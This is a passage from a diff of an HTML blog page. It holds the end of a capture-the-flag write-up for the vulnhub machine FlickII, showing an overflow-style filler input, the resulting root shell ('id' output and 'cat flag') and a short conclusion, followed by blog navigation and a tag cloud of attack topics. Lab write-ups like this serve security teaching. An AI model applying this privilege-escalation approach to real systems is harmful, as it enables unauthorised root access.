+<span class="code-line"><span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAq</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Output</span><span class="w"> </span><span class="n">directory</span><span class="w"> </span><span class="k">is</span><span class="p">:</span><span class="w"> </span><span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<p>And it got us a root shell from where we can get the flag:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="o">[</span><span class="n">root@fII storage</span><span class="o">]</span><span class="err">#</span><span class="w"> </span><span class="n">id</span><span class="w"></span></span>
+<span class="code-line"><span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">),</span><span class="mi">1001</span><span class="p">(</span><span class="n">bryan</span><span class="p">),</span><span class="mi">1002</span><span class="p">(</span><span class="n">sean</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">root</span><span class="nv">@fII</span><span class="w"> </span><span class="n">root</span><span class="err">]#</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">flag</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">  </span><span class="err">█████▒██▓</span><span class="w">     </span><span class="err">██▓</span><span class="w"> </span><span class="err">▄████▄</span><span class="w">   </span><span class="err">██</span><span class="w"> </span><span class="err">▄█▀</span><span class="w"> </span><span class="err">██▓</span><span class="w"> </span><span class="err">██▓</span><span class="w"></span></span>
+<span class="code-line"><span class="err">▓██</span><span class="w">   </span><span class="err">▒▓██▒</span><span class="w">    </span><span class="err">▓██▒▒██▀</span><span class="w"> </span><span class="err">▀█</span><span class="w">   </span><span class="err">██▄█▒</span><span class="w"> </span><span class="err">▓██▒▓██▒</span><span class="w"></span></span>
+<span class="code-line"><span class="err">▒████</span><span class="w"> </span><span class="err">░▒██░</span><span class="w">    </span><span class="err">▒██▒▒▓█</span><span class="w">    </span><span class="err">▄</span><span class="w"> </span><span class="err">▓███▄░</span><span class="w"> </span><span class="err">▒██▒▒██▒</span><span class="w"></span></span>
+<span class="code-line"><span class="err">░▓█▒</span><span class="w">  </span><span class="err">░▒██░</span><span class="w">    </span><span class="err">░██░▒▓▓▄</span><span class="w"> </span><span class="err">▄██▒▓██</span><span class="w"> </span><span class="err">█▄</span><span class="w"> </span><span class="err">░██░░██░</span><span class="w"></span></span>
+<span class="code-line"><span class="err">░▒█░</span><span class="w">   </span><span class="err">░██████▒░██░▒</span><span class="w"> </span><span class="err">▓███▀</span><span class="w"> </span><span class="err">░▒██▒</span><span class="w"> </span><span class="err">█▄░██░░██░</span><span class="w"></span></span>
+<span class="code-line"><span class="err">▒</span><span class="w"> </span><span class="err">░</span><span class="w">   </span><span class="err">░</span><span class="w"> </span><span class="err">▒░▓</span><span class="w">  </span><span class="err">░░▓</span><span class="w">  </span><span class="err">░</span><span class="w"> </span><span class="err">░▒</span><span class="w"> </span><span class="err">▒</span><span class="w">  </span><span class="err">░▒</span><span class="w"> </span><span class="err">▒▒</span><span class="w"> </span><span class="err">▓▒░▓</span><span class="w">  </span><span class="err">░▓</span><span class="w">  </span></span>
+<span class="code-line"><span class="err">░</span><span class="w">     </span><span class="err">░</span><span class="w"> </span><span class="err">░</span><span class="w"> </span><span class="err">▒</span><span class="w">  </span><span class="err">░</span><span class="w"> </span><span class="err">▒</span><span class="w"> </span><span class="err">░</span><span class="w">  </span><span class="err">░</span><span class="w">  </span><span class="err">▒</span><span class="w">   </span><span class="err">░</span><span class="w"> </span><span class="err">░▒</span><span class="w"> </span><span class="err">▒░</span><span class="w"> </span><span class="err">▒</span><span class="w"> </span><span class="err">░</span><span class="w"> </span><span class="err">▒</span><span class="w"> </span><span class="err">░</span><span class="w"></span></span>
+<span class="code-line"><span class="err">░</span><span class="w"> </span><span class="err">░</span><span class="w">     </span><span class="err">░</span><span class="w"> </span><span class="err">░</span><span class="w">    </span><span class="err">▒</span><span class="w"> </span><span class="err">░░</span><span class="w">        </span><span class="err">░</span><span class="w"> </span><span class="err">░░</span><span class="w"> </span><span class="err">░</span><span class="w">  </span><span class="err">▒</span><span class="w"> </span><span class="err">░</span><span class="w"> </span><span class="err">▒</span><span class="w"> </span><span class="err">░</span><span class="w"></span></span>
+<span class="code-line"><span class="w">          </span><span class="err">░</span><span class="w">  </span><span class="err">░</span><span class="w"> </span><span class="err">░</span><span class="w">  </span><span class="err">░</span><span class="w"> </span><span class="err">░</span><span class="w">      </span><span class="err">░</span><span class="w">  </span><span class="err">░</span><span class="w">    </span><span class="err">░</span><span class="w">   </span><span class="err">░</span><span class="w">  </span></span>
+<span class="code-line"><span class="w">                  </span><span class="err">░</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">You</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">successfully</span><span class="w"> </span><span class="n">completed</span><span class="w"> </span><span class="n">FlickII</span><span class="err">!</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">I</span><span class="w"> </span><span class="n">hope</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">learnt</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">much</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">did</span><span class="w"> </span><span class="k">while</span><span class="w"></span></span>
+<span class="code-line"><span class="n">making</span><span class="w"> </span><span class="n">it</span><span class="err">!</span><span class="w"> </span><span class="ow">Any</span><span class="w"> </span><span class="n">comments</span><span class="o">/</span><span class="n">suggestions</span><span class="w"> </span><span class="n">etc</span><span class="p">,</span><span class="w"></span></span>
+<span class="code-line"><span class="n">feel</span><span class="w"> </span><span class="k">free</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="n">me</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">freenode</span><span class="w"> </span><span class="ow">in</span><span class="w"></span></span>
+<span class="code-line"><span class="n">#vulnhub</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">twitter</span><span class="w"> </span><span class="nv">@leonjza</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="conclusion">Conclusion</h2>
+<p>This was a really great challange! The android part was a really new to me. The
+exploitation part was very interesting!.</p>
+<p>Many thanks to TurboSmouem for the challange and as usual thanks to vulnhub.</p>
+    </div>
+
+      <footer>
+          <div>
+            <b>Previous article:</b> <a href="../../2016/02/auditing-exchange-server.html"> Auditing Exchange Server </a>
+          </div>
+          <div>
+            <b>Next article:</b> <a href="../../2016/04/installing-osmc-without-installer.html"> Installing OSMC without installer </a>
+          </div>
+
+<div class="social-buttons">
+
+
+</div>
+      </footer>
+
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-links"></span>
+                    <a href="/pages/links.html">links</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/maggick_fr">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+            <li class="tag tag-3">
+              <a href="../../tag/openadmin.html">openAdmin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dll.html">DLL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/pypi.html">pypi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bolt-cms.html">bolt CMS</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/upload.html">Upload</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/memcache.html">memcache</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nmap.html">nmap</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bludit.html">bludit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nosql.html">NoSQL</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/azure.html">Azure</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/linux.html">linux</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/umbraco.html">umbraco</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/tomcat.html">tomcat</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/jackson.html">jackson</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/javascript.html">javascript</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/webassembly.html">webassembly</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/laravel.html">laravel</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vnc.html">VNC</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ldap.html">LDAP</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/boot2root.html">boot2root</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/python.html">python</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/re.html">RE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/deserialization.html">deserialization</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xss.html">XSS</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/git.html">git</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/php.html">php</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/suid.html">SUID</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vb.html">VB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/core-dump.html">core dump</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cloudme.html">cloudme</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chef.html">chef</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/docker.html">docker</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/web.html">web</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxc.html">lxc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/crypto.html">Crypto</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dnsadmins.html">DnsAdmins</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adb.html">adb</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/msfvenom.html">msfvenom</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cewl.html">cewl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/path.html">PATH</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phishing.html">phishing</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/rsa.html">RSA</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/msfconsole.html">msfconsole</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xxe.html">XXE</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/php-filter.html">php filter</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssti.html">SSTI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/yaml.html">YAML</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nft.html">NFT</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sqli.html">SQLi</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/cve.html">CVE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/impacket.html">impacket</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/challenge.html">challenge</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openbsd.html">OpenBSD</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openemr.html">openEMR</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/print-nightmare.html">print nightmare</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sudo.html">sudo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/capabilities.html">capabilities</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/logrotate.html">logrotate</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/enumeration.html">enumeration</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chisel.html">chisel</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/blog.html">blog</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lfi.html">LFI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/android.html">Android</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/journalctl.html">journalctl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phs.html">PHS</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/windows.html">windows</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/jwt.html">jwt</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/iot.html">IOT</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nostromo.html">nostromo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssrf.html">SSRF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cryptocurrency.html">cryptocurrency</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/ctf.html">CTF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/net.html">.NET</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxd.html">lxd</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/composer.html">composer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/teamviewer.html">teamviewer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nano.html">nano</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/splunk.html">Splunk</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/drupalgeddon.html">Drupalgeddon</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/scf-file-attack.html">SCF file attack</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adminer.html">adminer</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/smb.html">SMB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/zip.html">zip</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/strapi.html">strapi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/john.html">john</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/security.html">security</a>
+            </li>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+
+</div>
+</body>
+</html>
